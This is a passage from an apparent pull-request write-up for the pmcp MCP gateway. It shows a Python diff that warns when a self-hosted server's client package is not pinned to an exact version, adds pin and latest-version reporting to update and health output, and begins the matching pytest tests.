+) -> str | None:
+    """``docker run [inert flags] [-e KEY[=VALUE]]* <image>@<digest>``.
+
+    Nothing may follow the image: a container command, like
+    ``--entrypoint``, a bind mount or an ``--env-file``, decides what runs
+    INSIDE the pinned image, and a digest pins the image, not that (round 6,
+    X1). ``-e KEY`` is judged by the entry-env allowlist, as docker's own
+    family: only the server's declared keys and locale/terminal keys.
+    """
+    if not args or args[0] != "run":
+        return "its argv is not `docker run ...`"
+    skip = False
+    for index, arg in enumerate(args[1:], start=1):
+        if skip:
+            skip = False
+            continue
+        if (
+            len(arg) > 2
+            and arg[0] == "-"
+            and arg[1] != "-"
+            and all(f"-{letter}" in _DOCKER_INERT_BOOLEAN_FLAGS for letter in arg[1:])
+        ):
+            continue  # combined inert short flags, e.g. `-it` (round 7, N2)
+        if arg.startswith("-"):
+            name, value = _split_flag(arg)
+            if name in _DOCKER_ENV_FLAGS:
+                assignment = (
+                    value
+                    if value is not None
+                    else (args[index + 1] if index + 1 < len(args) else "")
+                )
+                skip = value is None
+                key = assignment.partition("=")[0]
+                if not _entry_env_key_is_inert("docker", key, "", package, declared):
+                    return f"its argv sets container env {key or '<nothing>'}"
+                continue
+            if name in _DOCKER_INERT_BOOLEAN_FLAGS and value is None:
+                continue
+            if name in _DOCKER_INERT_VALUE_FLAGS:
+                skip = value is None
+                continue
+            return f"its argv passes {name}"
+        if arg != f"{package}@{pin}" and not (
+            arg.startswith(f"{package}:") and arg.endswith(f"@{pin}")
+        ):
+            return f"its argv runs image {arg!r}, not {package}@{pin}"
+        if index + 1 < len(args):
+            return (
+                f"its argv passes a container command after the image "
+                f"({args[index + 1]!r}), which decides what runs inside it"
+            )
+        return None
+    return "its argv names no image"
+
+
+def _argv_shape_problem(
+    package_type: str,
+    command: str,
+    args: list[str],
+    package: str,
+    pin: str,
+    declared: frozenset[str],
+) -> str | None:
+    """``None`` iff the argv is a recognised shape that runs *package* at *pin*."""
+    launcher = normalized_executable_name(command)
+    if package_type == "npm" and launcher == "npx":
+        return _npx_shape_problem(args, package, pin)
+    if package_type == "npm" and launcher == "npm":
+        if not args or args[0] not in ("exec", "x"):
+            return "its argv is not `npm exec ...`"
+        return _npx_shape_problem(args[1:], package, pin)
+    if package_type == "pypi" and launcher == "uvx":
+        return _uvx_shape_problem(args, package)
+    if package_type == "cargo" and launcher == "cargo":
+        return _cargo_shape_problem(args, package, pin)
+    if package_type == "docker" and launcher == "docker":
+        return _docker_shape_problem(args, package, pin, declared)
+    return f"pmcp does not model this {launcher!r} argv shape"
+
+
+def _entry_redirect(
+    package_type: str,
+    command: str,
+    args: list[str],
+    package: str,
+    pin: str,
+    config_env: Mapping[str, str] | None,
+    cwd: str | None = None,
+    declared: frozenset[str] = frozenset(),
+) -> str | None:
+    """What the ENTRY sets, besides its pin, that can change what runs.
+
+    ``None`` only when everything the entry controls is proven inert: its
+    argv has a recognised shape (``_argv_shape_problem``), every key of its
+    env block (``config.env``, which carries an overlay's ``server_env``) is
+    on the allowlist (``_entry_env_key_is_inert``), and it sets no cwd that
+    the launcher reads configuration from. Otherwise the first problem,
+    named. The host's environment and configuration files are trusted.
+
+    An entry-set *cwd* chooses which directory's project configuration the
+    launcher reads -- npm: a ``.npmrc`` at the local prefix, found by walking
+    up for ``package.json``/``node_modules`` (and a local bin there); uv:
+    ``uv.toml`` / ``pyproject.toml`` ``[tool.uv]`` up the tree; cargo:
+    ``.cargo/config.toml`` in the cwd and every parent -- so it is the entry's
+    to answer for (#295 plan rev 7, maintainer ruling). docker is exempt:
+    ``docker run`` reads no cwd-relative configuration. With no entry-set cwd
+    the child inherits pmcp's own, which is the host's.
+    """
+    shape = _argv_shape_problem(package_type, command, args, package, pin, declared)
+    if shape is not None:
+        return shape
+    for key in sorted(config_env or {}):
+        if not isinstance(key, str):
+            continue
+        value = (config_env or {}).get(key) or ""
+        if not _entry_env_key_is_inert(package_type, key, value, package, declared):
+            return f"the entry's env sets {key}, which is not on the list of keys known inert for it"
+    if cwd and package_type in _CWD_CONFIG_FAMILIES:
+        return (
+            f"the entry sets cwd {cwd!r}, whose project configuration "
+            f"{_CWD_CONFIG_FAMILIES[package_type]} reads"
+        )
+    return None
+
+
+# Launcher families whose resolution reads configuration relative to the cwd,
+# and the tool named in the message (see `_entry_redirect`).
+_CWD_CONFIG_FAMILIES = {"npm": "npm", "pypi": "uv", "cargo": "cargo"}
+
+
+def _npm_identity_refusal_cause(command: str) -> str:
+    """Why ``detect_package_type`` named no npm package: the ACTUAL cause.
+
+    Keyed on the launcher first (#295 board round 4, NB-1): identity reads
+    only a bare ``npx``/``npm`` command, so for ``npx.cmd`` or
+    ``/usr/bin/npx`` the resolver was never asked, and its status -- which
+    depends on whether an earlier lookup happened to start it -- says
+    nothing about this argv. Otherwise identity may be off (a sticky
+    DISABLED/fallback resolver, e.g. whenever ``npm_config_cache`` is set), or
+    on and refusing this argv because it does not name a registry package (a
+    tarball, an alias...), and the warning must not blame the first for the
+    second (round 3, N-d). ``status_summary`` never spawns.
+    """
+    if command not in ("npx", "npm"):
+        return (
+            "pmcp's npm identity check reads only a bare `npx`/`npm` command, "
+            f"and this one is {command!r}"
+        )
+    summary = get_resolver().status_summary()
+    if summary.startswith("active"):
+        return (
+            "npm's own parser did not identify a registry package in this argv "
+            f"(npm identity is {summary})"
+        )
+    return (
+        "npm package identity is unavailable "
+        f"(gateway_diagnostics.npm_identity: {summary})"
+    )
+
+
+def _read_spawn_pin(
+    command: str,
+    args: list[str],
+    env: Mapping[str, str] | None,
+    cwd: str | None,
+) -> tuple[str, str, str | None] | None:
+    """``(package_type, package, pin)`` for one spawning argv, or ``None``.
+
+    The same reading ``_unpinned_self_hosted_warning`` applies to ``args``:
+    ``detect_package_type`` and ``_detect_effective_version_pin``, with the
+    structural npx read when npm identity refuses (round 2, N2), and
+    ``uv tool run`` judged as uvx. ``None`` when pmcp cannot name a package.
+    """
+    if normalized_executable_name(command) == "uv" and args[:2] == ["tool", "run"]:
+        command, args = "uvx", args[2:]
+    package_type, package_name = detect_package_type(command, args, env, cwd)
+    if package_type != "unknown" and package_name:
+        pin = _detect_effective_version_pin(package_type, command, args, env, cwd)
+        return package_type, package_name, pin
+    if normalized_executable_name(command) != "npx":
+        return None
+    slot = _package_slot(args)
+    plain = split_plain_registry_spec(slot) if slot is not None else None
+    if plain is None:
+        return None
+    return "npm", plain[0], plain[1] if plain[1] and plain[1] != "latest" else None
+
+
+def _install_argv_problem(
+    manifest_server: ServerConfig | None,
+    package_type: str,
+    package: str,
+    pin: str,
+    env: Mapping[str, str] | None,
+    declared: frozenset[str],
+) -> str | None:
+    """Does every ``install`` argv run *package* at *pin*, in a known shape?
+
+    ``gateway.provision`` spawns ``install[platform]`` and adopts that
+    process as the live server (``JobManager.start_install`` ->
+    ``_finalize_server_ready``), and ``pmcp install`` runs it too, so for a
+    manifest-sourced server it is a spawning argv exactly like ``args``
+    (#295 board round 7, B1). Each non-empty platform argv must pass the
+    same pin, exactness, shape and env rules and name the same package at
+    the same pin -- the rule ``provision_gate._config_runs_exactly`` applies
+    to approvals. ``None`` when all do; else the first failure, naming the
+    platform and the argv. Its env is the entry's (``build_install_child_env``
+    carries the same ``extra_env`` and credential); its cwd is pmcp's own.
+    """
+    if manifest_server is None:
+        return None
+    for target, argv in sorted(manifest_server.install.items()):
+        if not argv:
+            continue
+        where = (
+            f"its {target} install argv (`{' '.join(argv)}`), which "
+            "gateway.provision spawns and adopts as the live server,"
+        )
+        command, rest = argv[0], list(argv[1:])
+        read = _read_spawn_pin(command, rest, env, None)
+        if read is None:
+            return f"{where} runs something pmcp cannot read"
+        install_type, install_package, install_pin = read
+        if (install_type, install_package, install_pin) != (package_type, package, pin):
+            return (
+                f"{where} does not run {package}@{pin} "
+                f"(it names {install_package}@{install_pin or 'latest'})"
+            )
+        if normalized_executable_name(command) == "uv":
+            command, rest = "uvx", rest[2:]
+        if not _argv_pin_is_exact(install_type, pin, command, rest):
+            return f"{where} does not hold one exact version"
+        problem = _entry_redirect(
+            install_type,
+            command,
+            rest,
+            install_package,
+            pin,
+            env,
+            None,
+            declared,
+        )
+        if problem is not None:
+            return f"{where} is not proven to run the pin: {problem}"
+    return None
+
+
+# Launchers whose argv pmcp reads for a package (besides the npm family): an
+# argv of theirs that pmcp cannot read fails loud, as the npm family does
+# since round 3 N-b (#295 board round 5, N5).
+_READ_LAUNCHERS = frozenset({"uvx", "pip", "pip3", "cargo", "docker"})
+# Package runners and wrappers pmcp does not model (round 6, N2): each can
+# fetch and run a package (bunx, pnpx, `pnpm dlx`, `yarn dlx`, `bun x`,
+# `uv run`) or run an arbitrary command line (sh -c, env, node <script>), so
+# pmcp cannot say what version runs. Loud, pinned or not. Any OTHER command
+# (a locally installed server binary) is the host's and is not judged.
+_UNMODELLED_RUNNERS = frozenset(
+    {
+        "bunx",
+        "bun",
+        "pnpx",
+        "pnpm",
+        "yarn",
+        "uv",
+        "deno",
+        "node",
+        "sh",
+        "bash",
+        "zsh",
+        "dash",
+        "ksh",
+        "fish",
+        "env",
+        "cmd",
+        "powershell",
+        "pwsh",
+    }
+)
+
+
+def _unpinned_self_hosted_warning(
+    server_name: str,
+    manifest_server: ServerConfig | None,
+    resolved: ResolvedServerConfig,
+    project_root: Path | None,
+) -> str | None:
+    """Warn when a self-hosted backend is served by an unpinned client.
+
+    Consiliency/pmcp#294, proposal 2. Fires only when BOTH hold:
+
+    * the manifest entry's ``api_key_optional_when`` relaxer is active on the
+      environment the child ACTUALLY receives: ``sanitized_subprocess_env``
+      of the resolved config's env, which is exactly what ``client/manager.py``
+      spawns with -- the gateway's own environment minus managed secrets, plus
+      the entry's env. So a relaxer exported in the shell that started pmcp
+      counts (Consiliency/pmcp#295 board, claude F2). This is an ADVISORY
+      read: the credential gates keep ``child_env=config.env`` and are not
+      touched (#124: for a gate, ignoring the ambient value is the safe
+      direction; for a warning, including it is); and
+    * what the ENTRY controls does not hold the client at one version: the
+      argv's selector is not exact for its launcher (``_argv_pin_is_exact``),
+      or the entry's argv shape, env block or cwd is not proven inert
+      (``_entry_redirect``: allowlists, #295 board rounds 4-6), or pmcp
+      cannot read its argv, or its launcher is a runner or wrapper pmcp does
+      not model.
+
+    The host's own launcher configuration is trusted and out of scope (the
+    trust boundary above). A vendor-hosted server (relaxer inactive) never
+    warns: following the vendor's latest client is the intended default there.
+    """
+    if manifest_server is None or not isinstance(resolved.config, LocalMcpServerConfig):
+        return None
+    child_env = sanitized_subprocess_env(resolved.config.env, project_root)
+    relaxed_by = credential_requirement(manifest_server, child_env=child_env).relaxed_by
+    if relaxed_by is None:
+        return None
+    command, args = resolved.config.command, list(resolved.config.args)
+    env, cwd = resolved.config.env, resolved.config.cwd
+    if normalized_executable_name(command) == "uv" and args[:2] == ["tool", "run"]:
+        # `uv tool run` is uvx (round 6, N2): judge it as uvx.
+        command, args = "uvx", args[2:]
+    declared = _declared_env_keys(server_name)
+    package_type, package_name = detect_package_type(command, args, env, cwd)
+    note = ""
+    if package_type == "unknown" or not package_name:
+        launcher = normalized_executable_name(command)
+        if launcher in _UNMODELLED_RUNNERS:
+            return (
+                f"'{server_name}' talks to a self-hosted backend ({relaxed_by} is "
+                f"set), but pmcp cannot verify that its client is pinned: it "
+                f"launches through {launcher!r}, a package runner or wrapper "
+                "pmcp does not model. Launch the client with npx, uvx, cargo "
+                "or docker and an exact pin."
+            )
+        if launcher in _READ_LAUNCHERS:
+            # A launcher whose argv pmcp reads, with an argv it cannot read (an
+            # unrecognised flag, a non-bare spelling): fail loud, as the npm
+            # family does (round 5, N5).
+            return (
+                f"'{server_name}' talks to a self-hosted backend ({relaxed_by} is "
+                f"set), but pmcp cannot verify that its client is pinned: it "
+                f"cannot read which package this {launcher!r} argv runs. Pin an "
+                "exact version in the args of the config that launches it, in "
+                "a form pmcp reads."
+            )
+        # npm package identity is refused or disabled (#195; e.g. whenever
+        # `npm_config_cache` is set), or the launcher is not a bare npx/npm.
+        # Do not go silent (Consiliency/pmcp#295 board round 2, N2): for an
+        # npx launch, read the slot STRUCTURALLY with the materialiser's own
+        # grammar, and say so; if even that cannot name a plain registry
+        # package, warn that the pin cannot be verified.
+        if launcher not in ("npx", "npm"):
+            return None
+        cause = _npm_identity_refusal_cause(command)
+        # Only an npx argv has a structural slot pmcp can read (the provision
+        # gate's `_package_slot`); an `npm exec ...` launch fails LOUD instead
+        # of silent (round 3, N-b).
+        slot = _package_slot(args) if launcher == "npx" else None
+        plain = split_plain_registry_spec(slot) if slot is not None else None
+        if plain is None:
+            where = (
+                "its npx package slot is not a plain registry spec"
+                if launcher == "npx"
+                else "pmcp reads only an npx argv structurally, and this one "
+                "launches with npm"
+            )
+            return (
+                f"'{server_name}' talks to a self-hosted backend ({relaxed_by} is "
+                f"set), but pmcp cannot verify that its client is pinned: {cause}, "
+                f"and {where}. Pin an exact version in the args of the config "
+                "that launches it."
+            )
+        package_type, package_name = "npm", plain[0]
+        pin = plain[1] if plain[1] and plain[1] != "latest" else None
+        note = f" (read from the argv: {cause})"
+    else:
+        pin = _detect_effective_version_pin(package_type, command, args, env, cwd)
+    if pin and _argv_pin_is_exact(package_type, pin, command, args):
+        # The argv's selector holds the top-level package at one version.
+        # Suppress only when everything else the entry controls is proven
+        # inert (#295 board rounds 4-6); the host is trusted.
+        redirect = _entry_redirect(
+            package_type, command, args, package_name, pin, env, cwd, declared
+        )
+        if redirect is None and resolved.source == "manifest":
+            # A manifest-sourced server can also be spawned from its install
+            # argvs (gateway.provision adopts that process): every one must
+            # run the same pin (#295 board round 7, B1).
+            redirect = _install_argv_problem(
+                manifest_server, package_type, package_name, pin, env, declared
+            )
+        if redirect is None:
+            return None
+        return (
+            f"'{server_name}' talks to a self-hosted backend ({relaxed_by} is "
+            f"set), but pmcp cannot verify that its client is pinned: the argv "
+            f"pins {package_type}:{package_name} at {pin}, but {redirect}, which "
+            "can change what runs for that pin. Remove it from the entry to "
+            "hold the top-level package at the pinned version."
+        )
+    if package_type == "npm" and resolved.source == "manifest":
+        remedy = (
+            f"pin it with `server_version: {{{server_name}: <version>}}` in "
+            "~/.pmcp/manifest.yaml"
+        )
+    elif package_type == "docker":
+        remedy = (
+            "pin an image digest (`image@sha256:...`) in the args of the config "
+            "that launches it"
+        )
+    else:
+        remedy = "pin an exact version in the args of the config that launches it"
+    state = (
+        f"floats on '{pin}' ({_floating_reason(package_type, pin)})"
+        if pin
+        else "is unpinned"
+    )
+    return (
+        f"'{server_name}' talks to a self-hosted backend ({relaxed_by} is set) "
+        f"but its client {package_type}:{package_name} {state}{note}, so a spawn "
+        "or `pmcp update` can move it ahead of the server; " + remedy + "."
+    )
+
+
 # Human-readable label for a ResolvedServerConfig.source, used in messages
 # that need to point an operator at the file a pin (or other override) came
 # from.
@@ -2254,6 +3123,8 @@ class GatewayTools:
                 )
             )
 
+        self._attach_version_pin_warnings(servers)
+
         diagnostics = self._transport_diagnostics.model_copy()
         diagnostics.audit_buffer_size = self._audit_events.maxlen or len(
             self._audit_events
@@ -2276,6 +3147,69 @@ class GatewayTools:
             audit_events=list(self._audit_events) or None,
         )
 
+    def _version_pin_warning(self, server_name: str) -> str | None:
+        """`_unpinned_self_hosted_warning` for *server_name*'s effective config."""
+        manifest_server = load_manifest().get_server(server_name)
+        if manifest_server is None or not manifest_server.api_key_optional_when:
+            return None
+        resolved = self._load_all_configured_servers().get(
+            server_name
+        ) or manifest_server_to_config(manifest_server)
+        return _unpinned_self_hosted_warning(
+            server_name, manifest_server, resolved, self._project_root
+        )
+
+    #: (manifest_sources_fingerprint(), relaxer-declaring manifest entries).
+    _relaxable_cache: tuple[tuple[object, ...], dict[str, ServerConfig]] | None = None
+
+    def _relaxable_manifest_servers(self) -> dict[str, ServerConfig]:
+        """Manifest entries that declare ``api_key_optional_when``, cached.
+
+        gateway.health is polled; ``load_manifest()`` costs ~90 ms and logs a
+        WARNING per call while an unapproved project overlay is present. Re-load
+        only when a manifest source (or the trust store) changes on disk
+        (Consiliency/pmcp#295 board, claude F3).
+        """
+        key = manifest_sources_fingerprint()
+        cached = self._relaxable_cache
+        if cached is not None and cached[0] == key:
+            return cached[1]
+        relaxable = {
+            name: server
+            for name, server in load_manifest().servers.items()
+            if server.api_key_optional_when
+        }
+        self._relaxable_cache = (key, relaxable)
+        return relaxable
+
+    def _attach_version_pin_warnings(self, servers: list[ServerHealthInfo]) -> None:
+        """Add the unpinned-self-hosted warning to each health entry it applies to.
+
+        Judged on the config the gateway actually CONNECTED the server with
+        (``get_connected_configs``), not on a fresh config read: that is the
+        argv and env that are running, and it costs no file I/O. A server that
+        is not connected is not judged here (update_server still warns for
+        it). Advisory only: any failure is logged at DEBUG and the entries are
+        left as they are.
+        """
+        try:
+            relaxable = self._relaxable_manifest_servers()
+            wanted = [info for info in servers if info.name in relaxable]
+            if not wanted:
+                return
+            connected = self._client_manager.get_connected_configs()
+            for info in wanted:
+                resolved = connected.get(info.name)
+                if resolved is None:
+                    continue
+                warning = _unpinned_self_hosted_warning(
+                    info.name, relaxable[info.name], resolved, self._project_root
+                )
+                if warning:
+                    info.warnings.append(warning)
+        except Exception as exc:  # advisory; never fail health over it
+            logger.debug(f"version-pin warnings skipped: {exc}")
+
     def _config_source_paths_by_server(self) -> dict[str, tuple[str, str]]:
         paths: dict[str, tuple[str, str]] = {}
         for source in load_config_sources(
@@ -4898,8 +5832,29 @@ class GatewayTools:
         Freezing the ambient environment across the update is deliberately NOT
         done here; it would mean threading a frozen env through ClientManager,
         which is a separate concern from this TOCTOU.
+
+        Wrapped (Consiliency/pmcp#294): the unpinned-self-hosted warning is
+        computed on the configuration as it stands AFTER the update attempt and
+        never changes ``ok`` -- an unpinned self-hosted client is still updated,
+        and still warned about, because it is still unpinned.
         """
+        # Validated HERE, in the handler the advertised schema is derived for
+        # (tests/test_gateway_tool_schemas.py, Consiliency/pmcp#236 piece A).
         parsed = UpdateServerInput.model_validate(input_data)
+        result = await self._update_server_unwarned(parsed)
+        try:
+            warning = self._version_pin_warning(result.server)
+        except Exception as exc:  # advisory; never fail the update over it
+            logger.debug(f"version-pin warning skipped: {exc}")
+            warning = None
+        if warning:
+            result.warnings.append(warning)
+        return result
+
+    async def _update_server_unwarned(
+        self, parsed: UpdateServerInput
+    ) -> UpdateServerOutput:
+        """The body of ``update_server``; its docstring states the contracts."""
         server_name = parsed.server_name
 
         # Resolve the server's EFFECTIVE config through the exact same
@@ -4994,14 +5949,101 @@ class GatewayTools:
             source_desc = _CONFIG_SOURCE_LABELS.get(
                 resolved_config.source, f"the {resolved_config.source} config"
             )
+            # "Pinned at X, newer available: Y" (Consiliency/pmcp#294). A
+            # registry READ only -- nothing is probed, fetched or restarted.
+            # `get_package_version` strips the pin off the spec, so this is the
+            # registry's latest, compared three-way (never negated, #164).
+            latest_available, _ = await get_package_version(
+                command, args, server_env, server_cwd, timeout=5.0
+            )
+            # A range, a dist-tag or a docker tag still stops this tool (the
+            # operator chose it), but it is not a pin: it can resolve to
+            # another artifact at a later spawn, so it is reported as
+            # FLOATING, never as "pinned at ^3.25.0" (Consiliency/pmcp#295
+            # board, codex P2 / claude F1; a docker tag since round 4, C2).
+            exact = _argv_pin_is_exact(package_type, pinned_to, command, args)
+            # An exact selector in an argv whose SHAPE runs something else
+            # (a container command after a pinned image, `npx -p X sh -c`,
+            # `uvx --from X sh`) is not a pinned client: report it as floating,
+            # never `[PINNED]` (#295 board round 6, X1).
+            shape_problem = (
+                _argv_shape_problem(
+                    package_type,
+                    command,
+                    args,
+                    package_name,
+                    pinned_to,
+                    _declared_env_keys(server_name),
+                )
+                if exact
+                else None
+            )
+            if shape_problem is None and exact and resolved_config.source == "manifest":
+                # What gateway.provision spawns and adopts must run the same pin,
+                # or the report would call a latest client [PINNED] (round 7, B1).
+                shape_problem = _install_argv_problem(
+                    load_manifest().get_server(server_name),
+                    package_type,
+                    package_name,
+                    pinned_to,
+                    server_env,
+                    _declared_env_keys(server_name),
+                )
+            if shape_problem is not None:
+                exact = False
+            # SemVer build metadata selects nothing: `pkg@3.25.5+x` runs
+            # 3.25.5. Report what runs, and say the suffix was ignored -- the
+            # manifest path refuses such a pin outright; a configured argv is
+            # the operator's own and is labelled honestly instead (#295 board
+            # round 2, N3).
+            build_note = ""
+            if exact and package_type in ("npm", "cargo") and "+" in pinned_to:
+                pinned_to, _, build = pinned_to.partition("+")
+                build_note = (
+                    f" (build metadata '+{build}' is ignored by {package_type})"
+                )
+            comparison = (
+                compare_versions(pinned_to, latest_available, package_type)
+                if latest_available and exact
+                else None
+            )
+            if not exact:
+                availability = (
+                    f"'{pinned_to}' does not hold the client at one version "
+                    f"({shape_problem or _floating_reason(package_type, pinned_to)}): "
+                    "a later spawn can run "
+                    f"another one (latest: {latest_available or 'unknown'})."
+                )
+            elif comparison == "newer":
+                availability = (
+                    f"Pinned at {pinned_to}, newer available: {latest_available}."
+                )
+            elif comparison == "not_newer":
+                availability = f"Pinned at {pinned_to}, up to date."
+            elif comparison == "incomparable":
+                availability = (
+                    f"Pinned at {pinned_to}; the latest ({latest_available}) "
+                    "cannot be ordered against it."
+                )
+            else:
+                availability = (
+                    f"Pinned at {pinned_to}; the latest version could not be "
+                    "determined."
+                )
             return UpdateServerOutput(
                 ok=False,
                 server=server_name,
                 package_type=package_type,
                 package_name=package_name,
+                pinned_version=pinned_to if exact else None,
+                floating_selector=None if exact else pinned_to,
+                latest_available=latest_available,
+                latest_comparison=comparison,
                 message=(
-                    f"'{server_name}' is pinned to '{pinned_to}' in {source_desc} "
-                    f"({command} {' '.join(args)}). gateway.update_server will not "
+                    f"'{server_name}' is {'pinned to' if exact else 'held at'} "
+                    f"'{pinned_to}'{build_note} in {source_desc} "
+                    f"({command} {' '.join(args)}). {availability} "
+                    "gateway.update_server will not "
                     "move a pinned server to the latest version -- edit or remove "
                     "the pin in that config to allow updates."
                 ),
diff --git a/src/pmcp/types.py b/src/pmcp/types.py
index 95b5a53..0f273bb 100644
--- a/src/pmcp/types.py
+++ b/src/pmcp/types.py
@@ -1028,6 +1028,9 @@ class ServerHealthInfo(BaseModel):
     auth_metadata: AuthMetadataInfo | None = None
     auth_challenge: AuthChallengeInfo | None = None
     url_elicitations: list[UrlElicitationInfo] | None = None
+    # Advisory, never a status change: e.g. an unpinned client talking to a
+    # self-hosted backend (Consiliency/pmcp#294).
+    warnings: list[str] = Field(default_factory=list)
 
 
 class HealthOutput(BaseModel):
@@ -1528,6 +1531,21 @@ class UpdateServerOutput(BaseModel):
     cancelled_request_count: int = 0
     cancelled_task_count: int = 0
     message: str
+    # Set only when the server is pinned and therefore was not moved
+    # (Consiliency/pmcp#294): the pin, the registry's latest, and
+    # `compare_versions(pinned_version, latest_available)` -- None when the
+    # latest could not be fetched. Three-way on purpose (#164).
+    pinned_version: str | None = None
+    # Set instead of pinned_version when the config holds the server at a
+    # range, a dist-tag or a docker tag (`^3.25.0`, `next`, `img:3.25.5`): the
+    # tool still does not move it, but it is not a pin -- it can resolve to
+    # another artifact at a later spawn (#295 board).
+    floating_selector: str | None = None
+    latest_available: str | None = None
+    latest_comparison: Literal["newer", "not_newer", "incomparable"] | None = None
+    # Advisory; never changes `ok`. E.g. an unpinned client talking to a
+    # self-hosted backend.
+    warnings: list[str] = Field(default_factory=list)
 
 
 class AuthConnectInput(GatewayArguments):
diff --git a/tests/test_pkgid_panel_fixes.py b/tests/test_pkgid_panel_fixes.py
index 41cadd8..aa7cf6a 100644
--- a/tests/test_pkgid_panel_fixes.py
+++ b/tests/test_pkgid_panel_fixes.py
@@ -894,6 +894,14 @@ async def test_update_server_still_refuses_a_pinned_manifest_server_as_before(
         manifest_servers={"shipped": server},
     )
 
+    # The pinned branch now reads the registry's latest to report "newer
+    # available" (Consiliency/pmcp#294). Stub it: this refusal path was offline
+    # before that change and must stay offline.
+    async def no_registry(*_args: Any, **_kwargs: Any) -> tuple[None, str]:
+        return (None, "npm")
+
+    monkeypatch.setattr(handlers_module, "get_package_version", no_registry)
+
     result = await gateway.update_server({"server_name": "shipped"})
 
     assert result.ok is False
```

## Test bodies

`tests/test_version_pin.py`, verbatim from the spike (`ruff format`-clean):

```python
"""First-class client version pins (Consiliency/pmcp#294, proposals 1 and 2).

Proposal 1: a manifest entry may carry ``version:``, and an overlay may set it
on an existing (e.g. shipped) entry with ``server_version:`` -- without
restating the install matrix. The pin is materialised into the npx package
slot of ``args`` AND every ``install`` argv, keeping the package NAME from the
entry, so an overlay can choose a version of the same package and nothing
else. ``gateway.update_server`` then reports "pinned at X, newer available: Y".

Proposal 2: an entry whose ``api_key_optional_when`` relaxer is active (a
self-hosted backend is configured) and whose client is unpinned carries a
warning in ``gateway.health`` and ``gateway.update_server``.

Offline: npm argv is read with the node-less tables (``npm_tables``), and the
registry lookup is a monkeypatched ``get_package_version``.
"""

from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Any, cast

import pytest
import yaml

from pmcp.config.loader import _merge_manifest_defaults, manifest_server_to_config
from pmcp.manifest.loader import (
    Manifest,
    ServerConfig,
    credential_requirement,
    load_manifest,
    manifest_sources_fingerprint,
    split_plain_registry_spec,
)
from pmcp.policy.policy import PolicyManager
from pmcp.provision_gate import _config_runs_exactly
from pmcp.tools import handlers as handlers_module
from pmcp.tools.handlers import GatewayTools
from pmcp.types import (
    LocalMcpServerConfig,
    ResolvedServerConfig,
    ServerStatus,
    ServerStatusEnum,
)

PLATFORMS = ("mac", "linux", "wsl", "windows")


@pytest.fixture(autouse=True)
def _isolate_overlays(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """No ambient overlay: HOME is already isolated by conftest; add a clean cwd."""
    monkeypatch.delenv("PMCP_MANIFEST_PATH", raising=False)
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.chdir(work)


@pytest.fixture(autouse=True)
def _no_ambient_npm_config(monkeypatch: pytest.MonkeyPatch) -> None:
    """No npm configuration from the host's environment (dev0 exports
    npm_config_cache): the warning reads the child's environment, and a
    test that wants a key sets it itself."""
    import os

    for key in list(os.environ):
        if key.lower().startswith("npm_config_") or key.upper() == "NODE_OPTIONS":
            monkeypatch.delenv(key)


#: The handler tests' entries stand for SHIPPED manifest entries: pmcp's own
#: manifest declares their credential and relaxer keys (rev 9: only shipped
#: declarations exempt a key). Names outside this set are overlay-only.
_TEST_SHIPPED_NAMES = frozenset(
    {"fc", "dk", "dg", "du", "dh", "dc1", "uv", "cg", "sh1", "ok1", "rn1", "ut1", "ut2"}
)


@pytest.fixture(autouse=True)
def _test_entries_are_shipped(monkeypatch: pytest.MonkeyPatch) -> None:
    # getattr/raising=False: the fixture must not error on a tree without the
    # rev-9 seam, so red-on-previous-revision runs measure behaviour.
    real = getattr(handlers_module, "_shipped_manifest_declarations", dict)()
    table = dict(real)
    for name in _TEST_SHIPPED_NAMES:
        table[name] = frozenset({"SELFHOST_API_KEY", "SELFHOST_API_URL"})
    monkeypatch.setattr(
        handlers_module, "_shipped_manifest_declarations", lambda: table, raising=False
    )


@pytest.fixture
def npm_tables(monkeypatch: pytest.MonkeyPatch) -> None:
    """Read npm argv with the node-less tables, whatever npm the host has."""
    from pmcp.manifest import version_checker

    def tables(
        args: list[str], command: str, env: Any = None, cwd: Any = None
    ) -> str | None:
        return version_checker._npm_package_arg_from_tables(args, command)

    monkeypatch.setattr(version_checker, "_npm_package_arg", tables)
    monkeypatch.setattr(handlers_module, "_npm_package_arg", tables)


def _user_overlay(text: str) -> None:
    path = Path.home() / ".pmcp" / "manifest.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def _warnings(caplog: pytest.LogCaptureFixture) -> list[str]:
    return [r.getMessage() for r in caplog.records if r.levelno >= logging.WARNING]


# ---------------------------------------------------------------------------
# Proposal 1 -- the manifest side
# ---------------------------------------------------------------------------


def test_server_version_pins_the_shipped_firecrawl_entry_everywhere_it_spawns() -> None:
    """One overlay line pins args AND every install argv; nothing else changes."""
    shipped = load_manifest().servers["firecrawl"]
    assert shipped.version is None
    _user_overlay('server_version:\n  firecrawl: "3.25.5"\n')

    pinned = load_manifest().servers["firecrawl"]

    assert pinned.version == "3.25.5"
    assert pinned.args == ["-y", "firecrawl-mcp@3.25.5"]
    assert pinned.install == {
        p: ["npx", "-y", "firecrawl-mcp@3.25.5"] for p in PLATFORMS
    }
    # The provision gate's own definition of "runs exactly this spec".
    assert _config_runs_exactly(pinned, "firecrawl-mcp@3.25.5")
    for field_name in ("command", "env_var", "api_key_optional_when", "extra_env"):
        assert getattr(pinned, field_name) == getattr(shipped, field_name)


def test_version_replaces_an_existing_tag_on_a_scoped_package() -> None:
    """``@playwright/mcp@latest`` becomes ``@playwright/mcp@1.2.3``, scope kept."""
    _user_overlay('server_version:\n  playwright: "1.2.3"\n')

    pinned = load_manifest().servers["playwright"]

    assert pinned.args == ["-y", "@playwright/mcp@1.2.3"]
    assert _config_runs_exactly(pinned, "@playwright/mcp@1.2.3")


def test_version_key_on_a_whole_servers_entry_is_materialised() -> None:
    _user_overlay(
        """
servers:
  pinned-custom:
    description: "custom"
    keywords: [c]
    install:
      linux: ["npx", "-y", "custom-mcp"]
    command: "npx"
    args: ["-y", "custom-mcp", "--port", "3000"]
    version: "2.0.0-rc.1"
"""
    )

    entry = load_manifest().servers["pinned-custom"]

    assert entry.args == ["-y", "custom-mcp@2.0.0-rc.1", "--port", "3000"]
    assert entry.install == {"linux": ["npx", "-y", "custom-mcp@2.0.0-rc.1"]}


@pytest.mark.parametrize(
    "raw",
    [
        '"^3.25.5"',  # range: re-resolves at every spawn
        '"~3.25.5"',
        '"3.x"',
        '"*"',
        '">=3.25.0"',
        '"latest"',  # dist-tag: the registry moves it
        '"next"',
